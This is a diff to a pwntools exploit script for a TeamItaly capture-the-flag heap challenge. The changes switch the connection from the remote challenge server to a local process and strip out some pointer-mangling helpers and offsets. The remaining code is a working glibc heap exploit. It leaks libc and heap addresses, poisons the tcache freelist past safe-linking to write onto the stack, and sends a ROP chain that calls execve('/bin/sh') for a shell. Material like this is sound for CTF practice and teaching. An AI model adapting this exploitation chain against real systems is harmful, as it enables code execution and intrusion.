@@ -53,39 +53,7 @@ def show(index):
     io.send(p32(index))
     return
 
-def deobfuscate(val):
-    mask = 0xfff << 52
-    while mask:
-        v = val & mask
-        val ^= (v >> 12)
-        mask >>= 12
-    return val
-def encrypt(v, key):
-    return p64(rol(v ^ key, 0x11, 64))
-rol = lambda val, r_bits, max_bits: \
-    (val << r_bits%max_bits) & (2**max_bits-1) | \
-    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
-ror = lambda val, r_bits, max_bits: \
-    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
-    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))
-
-exit_funcs = 0x219830
-
 offset = 0x219CE0
-
-one_gadget = 0xebcf8
-
-at_exit = 0x2159f8
-
-realloc_plt = 0x219020
-
-spawn = 0x50a37
-
-calloc_plt = 0x219050
-
-system = 0x50d60
-
-dl_fini = 0x6040
 
 fun_chunk = 0xfd0
 
@@ -104,9 +72,12 @@ pop_rdx_pop_rbx = 0x0000000000090529
 sh_off = 0x1d8698 
 
 execve = 0x00eb0f0
-#io = start()
-io = remote('log.challs.teamitaly.eu' ,29006)
-add_req(0x510,b'A'*0x510)
+
+io = start()
+
+#io = remote('log.challs.teamitaly.eu' ,29006)
+
+add_req(0x510,b'A'*0x510) #create chunk in unsorted bin to leak libc address
 
 chunk1 = 0x5e0
 
@@ -162,10 +133,14 @@ for i in range(7):
     remove(11-i)
 
 remove(12)
-remove(2) #now 3 and 4 has 2 and 3 indexes
+
+remove(2)#now 3 and 4 has 2 and 3 indexes
+
 remove(12)
+
 for i in range(7):
     add_req(0x10,b'A'*0x10) #19
+
 argvx = (libc_base + argv_off-0x10)^(heap_base+chunk1)>>12
 
 add_req(0x8,p64(argvx)) #20
@@ -183,6 +158,7 @@ remove(23)
 show(23)
 
 stack = io.recv()[0x18:-0x34]
+
 stack = int.from_bytes(stack,'little')
 
 
@@ -192,10 +168,14 @@ io.send(p32(9999))
 
 for i in range(8):
     add_req(0x50,b'A'*0x50) #25-32
+
 for i in range(7):
     remove(25)
+
 remove(32)
+
 remove(3)
+
 remove(32)
 for i in range(7):
     add_req(0x50,b'A'*0x50)
@@ -204,13 +184,11 @@ stack_ret = (stack-ret_off-0x8)^((heap_base+chunk2)>>12)
 
 add_req(0x50,p64(stack_ret)+b'A'*0x48)
 
-add_req(0x50,b'A'*0x50)
+add_req(0x50,b'A'*0x50) 
 
 add_req(0x50,b'A'*0x50)
 
 rop_chain =p64(0)+p64(libc_base+pop_rdi)+p64(libc_base+sh_off)+p64(libc_base+pop_rsi)+p64(0)+p64(libc_base+pop_rdx_pop_rbx)+p64(0)+p64(0)+p64(libc_base+execve)+p64(0)
-
-print(len(rop_chain))
 add_req(0x50,rop_chain)
 
 io.interactive()
